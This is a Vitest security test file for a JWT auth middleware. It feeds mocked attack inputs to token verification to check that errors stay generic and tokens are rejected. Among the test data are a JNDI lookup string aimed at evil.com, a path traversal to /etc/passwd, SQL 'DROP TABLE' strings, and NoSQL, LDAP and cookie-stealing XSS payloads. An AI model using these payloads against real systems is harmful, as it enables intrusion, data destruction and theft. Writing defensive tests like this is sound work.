/* eslint-disable @typescript-eslint/no-explicit-any */
/**
 * @fileoverview Security Vulnerability Tests for Auth Package
 * 
 * This comprehensive test suite validates the security measures implemented in the auth package
 * to protect against various attack vectors and security vulnerabilities. Each test simulates
 * real-world attack scenarios to ensure proper defense mechanisms are in place.
 * 
 * **Attack Categories Covered:**
 * - JWT Security: Token tampering, replay attacks, signature verification
 * - Injection Attacks: SQL, NoSQL, LDAP, XSS prevention
 * - Denial of Service: Resource exhaustion, timing attacks
 * - Information Disclosure: Secret leakage prevention
 * - Authorization Bypass: Header injection, privilege escalation
 * - Cryptographic Security: Algorithm confusion, key security
 * - Session Security: Hijacking, fixation prevention
 * - Input Validation: Unicode attacks, command injection
 * 
 * **Security Principles Tested:**
 * - Defense in depth: Multiple layers of security controls
 * - Fail securely: Secure defaults when errors occur
 * - Least privilege: Minimal access rights granted
 * - Input validation: All inputs properly sanitized
 * - Error handling: No sensitive information leaked
 * 
 * @author Zopio Security Team
 * @since 1.0.0
 * SPDX-License-Identifier: MIT
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { clerkAuthMiddleware } from '../clerk-auth-middleware.js';
import { verifyClerkToken } from '../lib/verify-clerk-token.js';
/**
 * Test utility to safely mock environment variables with automatic cleanup.
 * This ensures that environment changes don't leak between tests.
 * 
 * @param envVars - Object containing environment variables to set
 * @returns Object with restore method to cleanup environment changes
 * 
 * @example
 * ```typescript
 * const envMock = mockEnv({ API_KEY: 'test-key' });
 * // ... run tests ...
 * envMock.restore(); // Clean up
 * ```
 */
const mockEnv = (envVars: Record<string, string>) => {
  const originalEnv = process.env;
  process.env = { ...originalEnv, ...envVars };
  return {
    restore: () => {
      process.env = originalEnv;
    },
  };
};

/**
 * Creates a properly structured JWT verification result object that matches
 * the jose library's JWTVerifyResult interface requirements.
 * 
 * @param payload - JWT payload object
 * @returns Complete JWT verification result with required properties
 */
const createJWTVerifyResult = (payload: any) => ({
  protectedHeader: { alg: 'HS256', typ: 'JWT' },
  payload,
  key: new Uint8Array(32)
});

/**
 * Creates a timed Promise that resolves with a JWT result after specified delay.
 * Eliminates deep nesting in Promise/setTimeout callback chains.
 */
const createTimedTokenResolution = (payload: any, delay: number): Promise<any> => 
  new Promise(resolve => 
    setTimeout(() => resolve(createJWTVerifyResult(payload)), delay)
  );

/**
 * Creates a timed Promise that rejects with an error after specified delay.
 * Eliminates deep nesting in Promise/setTimeout callback chains.
 */
const createTimedTokenRejection = (error: Error, delay: number): Promise<never> => 
  new Promise((_, reject) => 
    setTimeout(() => reject(error), delay)
  );


// Mock the jose library
vi.mock('jose', () => ({
  jwtVerify: vi.fn(),
}));

import { jwtVerify } from 'jose';

// Get properly typed mock
const mockJoseJwtVerify = vi.mocked(jwtVerify);

/**
 * @describe Security Vulnerability Tests - Auth Package
 * 
 * Comprehensive security test suite that validates the auth package's resistance 
 * to various attack vectors. These tests simulate real-world attack scenarios
 * to ensure the authentication system maintains security under adversarial conditions.
 * 
 * **Test Structure:**
 * - Each test group focuses on a specific attack category
 * - Individual tests simulate specific attack vectors
 * - Assertions verify that attacks are properly mitigated
 * - Error messages are checked to prevent information disclosure
 * 
 * **Attack Simulation Approach:**
 * - Uses controlled mocking to simulate attack conditions
 * - Tests both positive and negative security outcomes
 * - Measures timing to detect potential timing attacks
 * - Validates error handling and information disclosure prevention
 */
describe('Security Vulnerability Tests - Auth Package', () => {
  let envMock: ReturnType<typeof mockEnv>;

  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    envMock?.restore();
  });

  /**
   * @describe JWT Token Security Tests
   * 
   * Tests the security of JWT token handling, focusing on common JWT-based attacks:
   * - Token tampering and signature verification bypass attempts
   * - Replay attacks using expired or reused tokens
   * - Token injection with malformed or malicious content
   * - Timing attacks to extract information about token validity
   * - Secret key exposure through error messages or side channels
   * 
   * **Attack Vectors Tested:**
   * - JWT signature tampering (modifying token without valid signature)
   * - Token replay attacks (reusing expired tokens)
   * - Token format manipulation (malformed JWT structures)
   * - Timing analysis attacks (measuring response times)
   * - Secret key extraction attempts through error analysis
   */
  describe('JWT token security', () => {
    /**
     * @test JWT Tampering Attack Prevention
     * 
     * **Attack Vector:** Attacker intercepts a valid JWT token and modifies the payload
     * to escalate privileges (e.g., changing role from 'user' to 'admin') while keeping
     * the same signature. This attack exploits systems that don't properly verify
     * JWT signatures against the payload content.
     * 
     * **Attack Example:** 
     * 1. Attacker captures legitimate JWT: {sub: "user_123", role: "user"}
     * 2. Modifies payload to: {sub: "admin_user", role: "admin"}
     * 3. Keeps original signature (now invalid)
     * 4. Attempts to use tampered token for admin access
     * 
     * **Expected Defense:** JWT signature verification should detect the tampering
     * and reject the token, preventing privilege escalation.
     */
    it('should prevent JWT tampering attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Mock JWT verification to reject tampered token
      mockJoseJwtVerify.mockRejectedValue(new Error('Invalid signature'));

      const tamperedToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl91c2VyIiwicm9sZSI6ImFkbWluIn0.TAMPERED_SIGNATURE';

      await expect(verifyClerkToken(tamperedToken)).rejects.toThrow('Invalid or expired token');
      
      expect(mockJoseJwtVerify).toHaveBeenCalled();
      const [tokenArg, keyArg] = mockJoseJwtVerify.mock.calls[0];
      expect(tokenArg).toBe(tamperedToken);
      expect(keyArg).toBeDefined();
    });

    /**
     * @test Token Replay Attack Prevention
     * 
     * **Attack Vector:** Attacker captures a valid JWT token and attempts to reuse it
     * after it has expired. This attack exploits systems that don't properly validate
     * token expiration times or rely on client-side expiration checks.
     * 
     * **Attack Example:**
     * 1. Attacker intercepts valid token during network communication
     * 2. Stores token for later use (token replay)
     * 3. Attempts to reuse expired token hours/days later
     * 4. Expects to gain unauthorized access with old credentials
     * 
     * **Expected Defense:** Token expiration validation should reject expired tokens
     * regardless of valid signatures, preventing unauthorized access.
     */
    it('should prevent token replay attacks with expired tokens', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Set up expired token test scenario
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Token expired'));

      const expiredToken = 'expired.jwt.token.here';
      
      await expect(verifyClerkToken(expiredToken)).rejects.toThrow('Invalid or expired token');
    });

    it('should prevent token injection with malformed tokens', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const malformedTokens = [
        '', // Empty token
        'not.a.jwt', // Invalid format
        'too.few.parts', // Not enough parts
        'too.many.parts.in.this.jwt.token', // Too many parts
        '...', // Empty parts
        'null.null.null', // Null parts
        'undefined.undefined.undefined', // Undefined parts
        '../../../etc/passwd', // Path traversal attempt
        '<script>alert("xss")</script>', // XSS attempt
        '${jndi:ldap://evil.com/a}', // JNDI injection attempt
      ];

      for (const malformedToken of malformedTokens) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Malformed token'));
        
        await expect(verifyClerkToken(malformedToken)).rejects.toThrow('Invalid or expired token');
      }
    });

    it('should prevent timing attacks on token verification', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const validToken = 'valid.jwt.token';
      const invalidToken = 'invalid.jwt.token';
      
      // Mock to simulate processing time
      mockJoseJwtVerify
        .mockImplementationOnce(() => createTimedTokenResolution({ sub: 'user_123' }, 50))
        .mockImplementationOnce(() => createTimedTokenRejection(new Error('Invalid token'), 50));

      const validStartTime = Date.now();
      await verifyClerkToken(validToken);
      const validEndTime = Date.now();
      const validDuration = validEndTime - validStartTime;

      const invalidStartTime = Date.now();
      try {
        await verifyClerkToken(invalidToken);
      } catch (error) {
        console.debug('Expected token verification failure:', error instanceof Error ? error.message : String(error));
      }
      const invalidEndTime = Date.now();
      const invalidDuration = invalidEndTime - invalidStartTime;

      // Time differences should be minimal to prevent timing attacks
      const timeDifference = Math.abs(validDuration - invalidDuration);
      expect(timeDifference).toBeLessThan(20); // Less than 20ms difference
    });

    it('should securely handle secret key exposure attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'sensitive-secret-key-12345' });
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Secret key compromised'));

      const request = new Request('http://localhost/test', {
        headers: { 'Authorization': 'Bearer compromised-token' },
      });

      const result = await clerkAuthMiddleware(request);
      
      expect(result).toBeInstanceOf(Response);
      const response = result as Response;
      const responseText = await response.text();
      
      // Ensure secret key is not leaked in error messages
      expect(responseText).not.toContain('sensitive-secret-key-12345');
      expect(responseText).not.toContain('Secret key');
      expect(responseText).toBe('Invalid authentication token');
    });
  });

  /**
   * @describe Injection Attack Prevention Tests
   * 
   * Tests protection against various injection attack vectors that attempt to
   * manipulate system behavior through malicious input in JWT tokens:
   * 
   * **Attack Categories:**
   * - SQL Injection: Malicious SQL commands in token payload
   * - NoSQL Injection: MongoDB/document DB query manipulation
   * - LDAP Injection: Directory service query manipulation  
   * - XSS Injection: Cross-site scripting through token data
   * - Command Injection: OS command execution attempts
   * 
   * **Defense Strategy:**
   * - Input validation and sanitization at all trust boundaries
   * - Parameterized queries and prepared statements
   * - Context-appropriate output encoding
   * - Principle of least privilege for data access
   * 
   * **Important Note:** The auth package focuses on token validation.
   * Application-level input sanitization should be implemented separately
   * for database queries, LDAP operations, and HTML rendering.
   */
  describe('injection attack prevention', () => {
    it('should prevent SQL injection attempts in token payload', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Malicious payload with SQL injection attempt
      const maliciousPayload = {
        sub: "'; DROP TABLE users; --",
        role: "admin' OR '1'='1",
        email: 'test@example.com\'; DELETE FROM sessions; --',
      };
      
      (mockJoseJwtVerify as any).mockResolvedValue({ payload: maliciousPayload });

      const result = await verifyClerkToken('malicious.jwt.token');
      
      // Should return the user ID as-is (our system doesn't use it in SQL directly)
      expect(result).toBe("'; DROP TABLE users; --");
      
      // The application should sanitize this before any database operations
      // This test documents the current behavior - additional sanitization 
      // should be done at the database query level
    });

    it('should prevent NoSQL injection attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const nosqlInjectionPayload = {
        sub: { $ne: null },
        role: { $regex: '.*admin.*' },
        permissions: { $where: 'function() { return true; }' },
      };
      
      (mockJoseJwtVerify as any).mockResolvedValue({ payload: nosqlInjectionPayload });

      const result = await verifyClerkToken('nosql.injection.token');
      
      // Should handle object payloads gracefully
      expect(result).toEqual({ $ne: null });
    });

    it('should prevent LDAP injection attempts', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const ldapInjectionPayload = {
        sub: 'user_123)(objectClass=*',
        cn: '*)(uid=*))(|(uid=*',
        organization: 'company*)(|(organizationalUnit=*',
      };
      
      (mockJoseJwtVerify as any).mockResolvedValue({ payload: ldapInjectionPayload });

      const result = await verifyClerkToken('ldap.injection.token');
      
      expect(result).toBe('user_123)(objectClass=*');
      
      // Applications should sanitize LDAP queries separately
    });

    it('should prevent XSS attempts in token data', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      const xssPayload = {
        sub: '<script>alert("XSS")</script>',
        name: '<img src="x" onerror="alert(\'XSS\')">',
        email: 'test+<script>alert(document.cookie)</script>@example.com',
      };
      
      (mockJoseJwtVerify as any).mockResolvedValue({ payload: xssPayload });

      const result = await verifyClerkToken('xss.attack.token');
      
      expect(result).toBe('<script>alert("XSS")</script>');
      
      // The application should HTML-escape this data before rendering
    });
  });

  describe('denial of service prevention', () => {
    it('should handle extremely large tokens without crashing', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Test malicious token directly
      const largeToken = 'a'.repeat(100000);
      
      mockJoseJwtVerify.mockRejectedValue(new Error('Token too large'));

      const startTime = Date.now();
      
      await expect(verifyClerkToken(largeToken)).rejects.toThrow('Invalid or expired token');
      
      const endTime = Date.now();
      const processingTime = endTime - startTime;
      
      // Should fail quickly to prevent DoS
      expect(processingTime).toBeLessThan(1000);
    });

    it('should handle rapid token verification requests', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      mockJoseJwtVerify.mockResolvedValue(createJWTVerifyResult({ sub: 'user_123' }));

      const promises = [];
      // Test brute force scenario
      const numRequests = 1000;
      
      const startTime = Date.now();
      
      for (let i = 0; i < numRequests; i++) {
        promises.push(verifyClerkToken(`token_${i}`));
      }
      
      await Promise.all(promises);
      
      const endTime = Date.now();
      const totalTime = endTime - startTime;
      
      // Should handle many requests efficiently
      expect(totalTime).toBeLessThan(5000); // Less than 5 seconds for 1000 requests
    });

    it('should prevent memory exhaustion with malicious payloads', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret-key' });
      
      // Create payload with deeply nested objects
      let deepObject: any = { value: 'test' };
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }
      
      const maliciousPayload = {
        sub: 'user_123',
        data: deepObject,
      };
      
      (mockJoseJwtVerify as any).mockResolvedValue({ payload: maliciousPayload });

      // Should handle without memory issues
      const result = await verifyClerkToken('deep.nested.token');
      expect(result).toBe('user_123');
    });

    it('should handle concurrent middleware requests without blocking', async () => {
      const requests = Array.from({ length: 100 }, (_, i) => 
        new Request('http://localhost/test', {
          headers: { 'Authorization': `Bearer token_${i}` },
        })
      );

      (mockJoseJwtVerify as any).mockImplementation(() => 
        Promise.resolve(createJWTVerifyResult({ sub: 'user_concurrent' }))
      );

      const startTime = Date.now();
      
      const promises = requests.map(request => clerkAuthMiddleware(request));
      const results = await Promise.all(promises);
      
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // All requests should succeed
      results.forEach(result => {
        expect(result).toBeInstanceOf(Request);
        expect((result as Request).user).toEqual({ id: 'user_concurrent' });
      });
      
      // Should handle concurrency efficiently
      expect(totalTime).toBeLessThan(2000);
    });
  });

  describe('information disclosure prevention', () => {
    it('should not leak sensitive information in error messages', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'super-secret-key-do-not-expose' });
      
      const sensitiveErrors = [
        'Database connection failed: password123',
        'CLERK_SECRET_KEY=super-secret-key-do-not-expose',
        'Internal server configuration: /etc/secrets/',
        'Stack trace: /home/user/app/secrets.json',
      ];

      for (const sensitiveError of sensitiveErrors) {
        mockJoseJwtVerify.mockRejectedValue(new Error(sensitiveError));
        
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': 'Bearer sensitive-error-token' },
        });

        const result = await clerkAuthMiddleware(request);
        const response = result as Response;
        const responseText = await response.text();
        
        // Should not leak sensitive information
        expect(responseText).toBe('Invalid authentication token');
        expect(responseText).not.toContain('password123');
        expect(responseText).not.toContain('super-secret-key');
        expect(responseText).not.toContain('/etc/secrets/');
        expect(responseText).not.toContain('secrets.json');
      }
    });

    it('should not expose internal system details', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // Test various error conditions that might expose system details
      const systemErrors = [
        new Error('ECONNREFUSED 127.0.0.1:5432'),
        new Error('Permission denied: /var/log/auth.log'),
        new Error('Module not found: /usr/local/lib/node_modules/secret-module'),
      ];

      for (const error of systemErrors) {
        mockJoseJwtVerify.mockRejectedValue(error);
        
        try {
          await verifyClerkToken('system-error-token');
        } catch (thrownError) {
          const errorMessage = (thrownError as Error).message;
          expect(errorMessage).toBe('Invalid or expired token');
          expect(errorMessage).not.toContain('127.0.0.1');
          expect(errorMessage).not.toContain('/var/log');
          expect(errorMessage).not.toContain('node_modules');
        }
      }
    });

    // ...
  });

  // ...

  describe('authentication bypass attempts', () => {
    // ...

    it('should prevent bypass through malformed authorization headers', async () => {
      const bypassAttempts = [
        'Bearer', // Missing token
        'Bearer ', // Empty token
        'Bearer  token', // Double space
        'Bearer\ttoken', // Tab character
        'Bearer\ntoken', // Newline injection
        'Bearer token extra', // Extra data
        'bearer token', // Lowercase bearer
        'Token token', // Wrong auth type
        ' Bearer token', // Leading space
        'Bearer token ', // Trailing space
      ];

      for (const malformedAuth of bypassAttempts) {
        const request = new Request('http://localhost/test', {
          headers: { 'Authorization': malformedAuth },
        });

        const result = await clerkAuthMiddleware(request);
        
        expect(result).toBeInstanceOf(Response);
        const response = result as Response;
        expect(response.status).toBe(401);
        
        const text = await response.text();
        expect(text).toBe('Invalid authentication token');
      }
    });

    // ...
  });

  // ...

  describe('timing attack mitigations', () => {
    // ...

    it('should prevent advanced timing attacks on token verification', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const timingTests = Array.from({ length: 20 }, (_, i) => ({
        token: `timing-test-token-${i}`,
        shouldSucceed: i % 2 === 0,
      }));

      const timings = [];
      
      for (const test of timingTests) {
        if (/[^\w.-]/.exec(test.token)) {
          mockJoseJwtVerify.mockResolvedValueOnce(createJWTVerifyResult({ sub: `user_${test.token}` }));
        } else {
          mockJoseJwtVerify.mockRejectedValueOnce(new Error('Invalid token'));
        }
        
        const startTime = process.hrtime.bigint();
        
        try {
          await verifyClerkToken(test.token);
        } catch (error) {
          console.debug('Timing test error (expected):', error instanceof Error ? error.message : String(error));
        }
        
        const endTime = process.hrtime.bigint();
        const duration = Number(endTime - startTime) / 1000000; // Convert to ms
        
        timings.push({ success: test.shouldSucceed, duration });
      }
      
      // Calculate timing statistics
      const successTimings = timings.filter(t => t.success).map(t => t.duration);
      const failureTimings = timings.filter(t => !t.success).map(t => t.duration);
      
      const avgSuccess = successTimings.reduce((a, b) => a + b, 0) / successTimings.length;
      const avgFailure = failureTimings.reduce((a, b) => a + b, 0) / failureTimings.length;
      
      // Timing difference should be minimal (constant-time behavior)
      const timingDifference = Math.abs(avgSuccess - avgFailure);
      expect(timingDifference).toBeLessThan(5); // Less than 5ms average difference
    });

    /**
     * Tests protection against cache timing attacks
     * where attackers try to determine cached vs uncached tokens
     */
    it('should prevent cache-based timing attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      // First access (cache miss)
      mockJoseJwtVerify.mockResolvedValueOnce(createJWTVerifyResult({ sub: 'cache_user' }));
      
      const firstStartTime = process.hrtime.bigint();
      await verifyClerkToken('cache-timing-token');
      const firstEndTime = process.hrtime.bigint();
      const firstDuration = Number(firstEndTime - firstStartTime) / 1000000;
      
      // Second access (potential cache hit)
      mockJoseJwtVerify.mockResolvedValueOnce(createJWTVerifyResult({ sub: 'cache_user' }));
      
      const secondStartTime = process.hrtime.bigint();
      await verifyClerkToken('cache-timing-token');
      const secondEndTime = process.hrtime.bigint();
      const secondDuration = Number(secondEndTime - secondStartTime) / 1000000;
      
      // Both operations should take similar time (no cache timing leak)
      const cachingTimeDifference = Math.abs(firstDuration - secondDuration);
      expect(cachingTimeDifference).toBeLessThan(10); // Less than 10ms difference
    });
  });

  describe('cryptographic security enhancements', () => {
    /**
     * Tests protection against downgrade attacks where
     * attackers try to force weaker cryptographic algorithms
     */
    it('should prevent cryptographic downgrade attacks', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'test-secret' });
      
      const downgradeAttempts = [
        { alg: 'HS256', strength: 'weak' }, // Weak HMAC
        { alg: 'none', strength: 'none' }, // No signature
        { alg: 'RS256', keySize: 1024 }, // Weak RSA key
        { alg: 'ES256', curve: 'P-256' }, // Weaker curve
      ];

      for (const _ of downgradeAttempts) {
        mockJoseJwtVerify.mockRejectedValue(new Error('Weak algorithm detected'));
        
        await expect(verifyClerkToken('downgrade.attempt.token')).rejects.toThrow('Invalid or expired token');
      }
    });

    /**
     * Tests protection against key extraction attacks
     * through error message analysis
     */
    it('should not leak key information through error messages', async () => {
      envMock = mockEnv({ CLERK_SECRET_KEY: 'super-secret-key-with-entropy-12345!@#' });
      
      const keyExtractionAttempts = [
        new Error('Key length mismatch: expected 32, got 16'),
        new Error('Invalid key format: RSA key expected'),
        new Error('Key checksum failed: 0x1234ABCD'),
        new Error('Decryption failed with key index 5'),
      ];

      for (const internalError of keyExtractionAttempts) {
        mockJoseJwtVerify.mockRejectedValue(internalError);
        
        try {
          await verifyClerkToken('key.extraction.token');
        } catch (error) {
          const errorMessage = (error as Error).message;
          
          // Should not leak any key information
          expect(errorMessage).toBe('Invalid or expired token');
          expect(errorMessage).not.toContain('key');
          expect(errorMessage).not.toContain('Key');
          expect(errorMessage).not.toContain('32');
          expect(errorMessage).not.toContain('RSA');
          expect(errorMessage).not.toContain('checksum');
        }
      }
    });
  });
});